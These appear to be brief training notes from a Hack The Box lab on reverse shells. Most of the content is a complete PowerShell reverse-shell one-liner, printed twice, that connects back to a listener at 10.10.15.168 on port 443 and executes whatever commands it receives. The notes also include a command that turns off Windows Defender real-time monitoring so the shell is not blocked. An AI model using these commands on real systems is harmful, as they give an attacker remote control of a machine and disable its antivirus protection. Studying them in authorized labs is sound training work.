With a reverse shell, the attack box will have a listener running and the target will need to initiate the connection

When establishing a reverse shell with a target the server acts a client connecting to the attackers Listener



since most firewalls dont block 443 connections its a commonly thing to bind your listener to.


#### Client (target)

Reverse Shells

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.168',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.168',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
If you paste this in powershell in windows it will be blocked by AV


#### Disable AV

Reverse Shells

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempt to execute the code again.


